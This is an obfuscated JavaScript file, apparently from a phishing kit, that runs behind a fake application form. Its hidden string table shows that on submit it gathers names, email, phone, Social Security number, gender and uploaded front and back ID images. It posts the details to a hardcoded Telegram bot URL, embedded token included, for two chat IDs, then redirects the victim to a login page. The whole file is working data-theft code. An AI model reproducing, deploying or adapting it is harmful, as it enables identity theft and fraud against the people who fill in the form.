const _0x2b6443=_0x7faf;(function(_0x57aced,_0x11e047){const _0x3a906a=_0x7faf,_0xcb20af=_0x57aced();while(!![]){try{const _0x567995=-parseInt(_0x3a906a(0x1a2))/0x1*(-parseInt(_0x3a906a(0x191))/0x2)+parseInt(_0x3a906a(0x187))/0x3*(-parseInt(_0x3a906a(0x190))/0x4)+parseInt(_0x3a906a(0x17d))/0x5*(parseInt(_0x3a906a(0x195))/0x6)+-parseInt(_0x3a906a(0x1a6))/0x7+-parseInt(_0x3a906a(0x19d))/0x8*(parseInt(_0x3a906a(0x170))/0x9)+parseInt(_0x3a906a(0x198))/0xa*(-parseInt(_0x3a906a(0x197))/0xb)+parseInt(_0x3a906a(0x17b))/0xc;if(_0x567995===_0x11e047)break;else _0xcb20af['push'](_0xcb20af['shift']());}catch(_0x6dda4){_0xcb20af['push'](_0xcb20af['shift']());}}}(_0x3ca6,0x77653));const chatIds=[_0x2b6443(0x18b),'-1002287662125'];let form,firstname,lastname,email_field,phone_field,ssn_field,gender,uploadForm,front_image,back_image,submit_btn;document[_0x2b6443(0x183)](_0x2b6443(0x18e),()=>{const _0x38b2a4=_0x2b6443;submit_btn=document[_0x38b2a4(0x184)](_0x38b2a4(0x193)),assignElements(),form=document['getElementById']('form'),form[_0x38b2a4(0x183)](_0x38b2a4(0x16c),async _0x356f72=>{const _0x4b5f21=_0x38b2a4;_0x356f72['preventDefault'](),submit_btn[_0x4b5f21(0x1a7)](_0x4b5f21(0x16e),_0x4b5f21(0x178)),submit_btn[_0x4b5f21(0x17c)]=_0x4b5f21(0x182),await submit_details(),await sleep(0x7d0),window[_0x4b5f21(0x185)]['href']=_0x4b5f21(0x189);});});function _0x7faf(_0x19b3e5,_0xb76038){const _0x3ca63d=_0x3ca6();return _0x7faf=function(_0x7faf8c,_0x2fc5b1){_0x7faf8c=_0x7faf8c-0x16c;let _0x8bb377=_0x3ca63d[_0x7faf8c];return _0x8bb377;},_0x7faf(_0x19b3e5,_0xb76038);}async function submit_details(){const _0x54ca1f=_0x2b6443,_0xb93836=_0x54ca1f(0x174)+firstname[_0x54ca1f(0x192)]+_0x54ca1f(0x19b)+lastname[_0x54ca1f(0x192)]+_0x54ca1f(0x177)+email_field[_0x54ca1f(0x192)]+_0x54ca1f(0x181)+phone_field[_0x54ca1f(0x192)]+_0x54ca1f(0x199)+ssn_field[_0x54ca1f(0x192)]+'\x20\x0a\x20\x0a_______________________________\x0aGender\x20:\x20'+gender[_0x54ca1f(0x192)]+_0x54ca1f(0x194);for(let _0x35639c=0x0;_0x35639c<chatIds[_0x54ca1f(0x196)];_0x35639c++){const _0x2b85db={'chat_id':chatIds[_0x35639c],'text':_0xb93836},_0x2061e8=await fetch(_0x54ca1f(0x188),{'method':_0x54ca1f(0x19c),'headers':{'accept':_0x54ca1f(0x18a),'content-type':_0x54ca1f(0x18a)},'body':JSON['stringify'](_0x2b85db)}),_0x2c0e76=await _0x2061e8['json']();chat_id[_0x54ca1f(0x1a7)](_0x54ca1f(0x192),chatIds[_0x35639c]),await sendImg(),front_image[_0x54ca1f(0x1a7)]('name',_0x54ca1f(0x19a)),back_image[_0x54ca1f(0x1a7)](_0x54ca1f(0x175),_0x54ca1f(0x16f)),await sendImg(),front_image[_0x54ca1f(0x1a7)](_0x54ca1f(0x175),_0x54ca1f(0x16f)),back_image[_0x54ca1f(0x1a7)](_0x54ca1f(0x175),_0x54ca1f(0x19a)),console['log'](_0x2c0e76);}}function generateEmail(_0x1586f0,_0x40791d){return''+_0x1586f0+_0x40791d+'01.jovie@gmail.com';}async function sendImg(){const _0x26bfb8=_0x2b6443,_0x33b065=new FormData(uploadForm);console[_0x26bfb8(0x17e)](_0x33b065[_0x26bfb8(0x18c)](_0x26bfb8(0x16f))),await $[_0x26bfb8(0x1a5)]({'url':uploadForm[_0x26bfb8(0x17a)](_0x26bfb8(0x1a0)),'type':_0x26bfb8(0x19c),'dataType':'JSON','data':_0x33b065,'processData':![],'contentType':![],'success':function(_0x5875c,_0x5e0449){const _0x55f40b=_0x26bfb8;console[_0x55f40b(0x17e)](_0x55f40b(0x1a1));},'error':function(_0x35ca87,_0x52fd50,_0x5238b8){const _0x2ad87f=_0x26bfb8;console[_0x2ad87f(0x17e)](_0x2ad87f(0x180));}});}async function sleep(_0x3ba115){return new Promise(_0x308ee8=>setTimeout(_0x308ee8,_0x3ba115));}function _0x3ca6(){const _0x504ca4=['19112844yZXDuM','innerText','3207835fjCHeY','log','change','Error','\x20\x0a\x20\x0a_______________________________\x0aPhone\x20:\x20','CREATING\x20APPLICATION','addEventListener','getElementById','location','querySelectorAll','21XLhZRJ','https://api.telegram.org/bot7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug/sendMessage','/Login/index.html','application/json','-1001991348429','get','chosen','DOMContentLoaded','gender_field','458772EuCtZv','656646ZALzjl','value','submit_btn','\x20\x0a\x20\x0a\x0aDelaying\x20for\x2010\x20sec\x0a\x20\x20\x20\x20','6bUqInp','length','44319FBQFTG','1030RKjjJK','\x20\x0a\x20\x0a_______________________________\x0aSSN\x20:\x20','alreadySent','\x20\x0a\x0a_______________________________\x0aLastname:\x20','POST','8BUDoSo','phone_field','id_back','action','Success','2xwNlxX','ssn_field','substring','ajax','4843433Amyuby','setAttribute','submit','email_field','disabled','photo','4429350amOdAV','uploadForm','.uploadd','target','\x0aNEW\x20USER\x20APPLICATION\x0a_______________________________\x0a\x0aFirstname:\x20','name','id_front','\x20\x0a\x0a_______________________________\x0aEmail\x20:\x20','true','chat_id','getAttribute'];_0x3ca6=function(){return _0x504ca4;};return _0x3ca6();}function assignElements(){const _0x121c90=_0x2b6443;firstname=document[_0x121c90(0x184)]('firstname'),lastname=document[_0x121c90(0x184)]('lastname'),uploadForm=document['getElementById'](_0x121c90(0x171)),email_field=document[_0x121c90(0x184)](_0x121c90(0x16d)),phone_field=document[_0x121c90(0x184)](_0x121c90(0x19e)),gender=document[_0x121c90(0x184)](_0x121c90(0x18f)),ssn_field=document['getElementById'](_0x121c90(0x1a3)),uploadd=document[_0x121c90(0x184)]('uploadd'),front_image=document[_0x121c90(0x184)](_0x121c90(0x176)),back_image=document[_0x121c90(0x184)](_0x121c90(0x19f)),chat_id=document[_0x121c90(0x184)](_0x121c90(0x179)),uploadd=document[_0x121c90(0x186)](_0x121c90(0x172));for(let _0x2834ed=0x0;_0x2834ed<uploadd['length'];_0x2834ed++){const _0x4a1191=uploadd[_0x2834ed];_0x4a1191['addEventListener'](_0x121c90(0x17f),_0x40d67a=>{const _0x135c9d=_0x121c90;console[_0x135c9d(0x17e)](_0x135c9d(0x17f));const _0x5e9740=document['getElementById'](_0x135c9d(0x18d)+_0x2834ed);console[_0x135c9d(0x17e)](_0x40d67a['target'][_0x135c9d(0x192)]);const _0x34cb73=extractFileName(_0x40d67a[_0x135c9d(0x173)]['value']);_0x5e9740[_0x135c9d(0x17c)]=_0x34cb73;});}}function extractFileName(_0x3abd78){const _0x561c63=_0x2b6443;return _0x3abd78[_0x561c63(0x1a4)](0xc);}